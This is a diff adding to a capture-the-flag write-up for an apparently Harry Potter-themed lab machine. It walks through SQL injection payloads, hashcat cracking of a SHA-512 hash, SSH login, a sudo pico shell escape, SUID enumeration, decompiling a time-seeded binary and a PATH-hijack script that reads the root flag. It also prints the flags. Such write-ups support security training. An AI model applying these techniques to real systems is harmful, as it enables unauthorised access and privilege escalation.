@@ -315,3 +315,321 @@ user='union select group_concat(notes),2,3,4 FROM users-- -
 
 user='union select group_concat(name),2,3,4 FROM users-- -
 
+"The password for Lucas Washington,Harry Turner,Andrea Phillips,Liam Hernandez,Adam Jenkins,Landon Alexander,Kennedy Anderson,Sydney Wright,Aaliyah Sanders,Olivia Murphy,Olivia Ross,Grace Brooks,Jordan White,Diego Baker,Liam Ward,Carlos Barnes,Carlos Lopez,Oliver Gonzalez,Sophie Sanchez,Maya Sanders,Joshua Reed,Aaliyah Allen,Jasmine King,Jonathan Long,Samuel Anderson,Julian Robinson,Gianna Harris,Madelyn Morgan,Ella Garcia,Zoey Gonzales,Abigail Morgan,Joseph Rivera,Elizabeth Cook,Parker Cox,Savannah Torres,Aaliyah Williams,Blake Washington,Claire Miller,Brody Stewart,Kimberly Murphy is incorrect! 4"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hash-identifier
+   #########################################################################
+```
+```text
+#     __  __                     __           ______    _____           #
+```
+```text
+#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+```
+```text
+#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+```
+```text
+#     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+```
+```text
+#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+```
+```text
+#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+```
+```text
+#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+```
+```text
+#                                                             By Zion3R #
+```
+```text
+#                                                    www.Blackploit.com #
+```
+
+## Exploitation
+```text
+#                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885
+
+Possible Hashs:
+[+] SHA-512
+[+] Whirlpool
+
+Least Possible Hashs:
+[+] SHA-512(HMAC)
+[+] Whirlpool(HMAC)
+--------------------------------------------------
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano hash_mad.txt                                        
+                                                                                                                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hashcat -m 1700 -a 0 hash_mad.txt -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 2058/4180 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 77
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+* Uses-64-Bit
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 1104517645
+* Runtime...: 8 secs
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1700 (SHA2-512)
+Hash.Target......: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd6...c5c885
+Time.Started.....: Mon Jun 26 20:18:23 2023 (15 secs)
+Time.Estimated...: Mon Jun 26 20:18:38 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  3076.0 kH/s (9.66ms) @ Accel:128 Loops:77 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 43642368/1104517645 (3.95%)
+Rejected.........: 0/43642368 (0.00%)
+Restore.Point....: 566272/14344385 (3.95%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
+Candidate.Engine.: Device Generator
+Candidates.#1....: wolfs1 -> w7w7w7
+Hardware.Mon.#1..: Util: 85%
+
+Started: Mon Jun 26 20:16:12 2023
+Stopped: Mon Jun 26 20:18:40 2023
+
+Hello Harry Turner!
+Even though Ron said password reuse is bad, I don't really care 
+
+Harry Turner:wingardiumleviosa123
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh harry@10.10.168.156                                                
+The authenticity of host '10.10.168.156 (10.10.168.156)' can't be established.
+ED25519 key fingerprint is SHA256:aoBkBWztoybmKKG6fmaF81L3u4vOoka0W8OgIKh3E7Y.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.168.156' (ED25519) to the list of known hosts.
+harry@10.10.168.156's password: wingardiumleviosa123
+ _      __    __                     __         __ __                          __
+ | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
+ | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
+ |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
+                                                        /___/
+
+Last login: Thu Nov 26 01:42:18 2020
+harry@hogwartz-castle:~$ id
+uid=1001(harry) gid=1001(harry) groups=1001(harry)
+
+harry@hogwartz-castle:~$ ls -lah
+total 32K
+drwxr-x--- 4 harry harry 4.0K Nov 26  2020 .
+drwxr-xr-x 4 root  root  4.0K Nov 26  2020 ..
+lrwxrwxrwx 1 root  root     9 Nov 26  2020 .bash_history -> /dev/null
+-rw-r----- 1 harry harry  220 Apr  4  2018 .bash_logout
+-rw-r----- 1 harry harry 3.7K Apr  4  2018 .bashrc
+drwx------ 2 harry harry 4.0K Nov 26  2020 .cache
+drwx------ 3 harry harry 4.0K Nov 26  2020 .gnupg
+-rw-r----- 1 harry harry  807 Apr  4  2018 .profile
+-rw-r----- 1 harry harry   40 Nov 26  2020 user1.txt
+harry@hogwartz-castle:~$ cat user1.txt 
+RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}
+
+harry@hogwartz-castle:~$ sudo -l
+[sudo] password for harry: 
+Matching Defaults entries for harry on hogwartz-castle:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User harry may run the following commands on hogwartz-castle:
+    (hermonine) /usr/bin/pico
+    (hermonine) /usr/bin/pico
+
+harry@hogwartz-castle:~$ sudo -u hermonine pico
+^R^X
+reset; bash 1>&0 2>&0
+
+hermonine@hogwartz-castle:~$ id
+uid=1002(hermonine) gid=1002(hermonine) groups=1002(hermonine)
+
+hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt 
+RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
+hermonine@hogwartz-castle:~$ find / -type f -user root -perm -u=s -exec ls -l {} + 2>/dev/null
+-rwsr-xr-x 1 root root        43088 Sep 16  2020 /bin/mount
+-rwsr-xr-x 1 root root        64424 Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root        44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root        26696 Sep 16  2020 /bin/umount
+-rwsr-xr-x 1 root root         8816 Nov 26  2020 /srv/time-turner/swagger
+-rwsr-xr-x 1 root root        76496 Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root        44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root        75824 Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root        37136 Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root        40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root        37136 Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root        59640 Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root        22520 Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root       149080 Sep 23  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root messagebus  42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root       113528 Oct  8  2020 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+hermonine@hogwartz-castle:/srv/time-turner$ ./swagger 
+Guess my number: 1234
+Nope, that is not what I was thinking
+I was thinking of 1344877159
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ scp harry@10.10.168.156:/srv/time-turner/swagger .
+harry@10.10.168.156's password: 
+swagger                      100% 8816     9.5KB/s   00:00 
+
+using ghidra
+
+undefined8 main(void)
+
+{
+  time_t tVar1;
+  long in_FS_OFFSET;
+  uint local_18;
+  uint local_14;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  tVar1 = time((time_t *)0x0);
+  srand((uint)tVar1);
+  local_14 = rand();
+  printf("Guess my number: ");
+  __isoc99_scanf(&DAT_00100b8d,&local_18);
+  if (local_14 == local_18) {
+    impressive();
+  }
+  else {
+    puts("Nope, that is not what I was thinking");
+    printf("I was thinking of %d\n",(ulong)local_14);
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+
+void impressive(void)
+
+{
+  setregid(0,0);
+  setreuid(0,0);
+  puts("Nice use of the time-turner!");
+  printf("This system architecture is ");
+  fflush(stdout);
+  system("uname -p");
+  return;
+}
+
+hermonine@hogwartz-castle:/srv/time-turner$ for i in $(seq 1 6) ; do echo 123 | ./swagger ; done
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 437290903
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 437290903
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 437290903
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 437290903
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 437290903
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 437290903
+
+hermonine@hogwartz-castle:/srv/time-turner$ ./swagger| grep -oE '[0-9]+' | ./swagger
+1
+Guess my number: Nice use of the time-turner!
+This system architecture is x86_64
+
+hermonine@hogwartz-castle:/srv/time-turner$ echo 1234 | ./swagger | tr -dc '0-9' | ./swagger 
+Guess my number: Nice use of the time-turner!
+This system architecture is x86_64
+
+hermonine@hogwartz-castle:/srv/time-turner$ cd /tmp
+hermonine@hogwartz-castle:/tmp$ cat > uname << EOF 
+> #!/bin/bash
+> cat /root/root.txt
+> EOF
+hermonine@hogwartz-castle:/tmp$ cat uname 
+#!/bin/bash
+cat /root/root.txt
+hermonine@hogwartz-castle:/tmp$ chmod +x uname
+hermonine@hogwartz-castle:/tmp$ export PATH=/tmp:$PATH
+hermonine@hogwartz-castle:/tmp$ echo 1234 | /srv/time-turner/swagger | tr -dc '0-9' | /srv/time-turner/swagger 
+Guess my number: Nice use of the time-turner!
+This system architecture is RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
+```
+User1.txt
+Find the different user. Keep enumerating.
+*RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}*
+User2.txt
+She is a know it all and wants you to share her love for the metric system
+*RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}*
+Root.txt
+Time is tricky. Can you trick time.
+*RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}*
+
+## Notes / Lessons Learned
+[[biteme]]
+
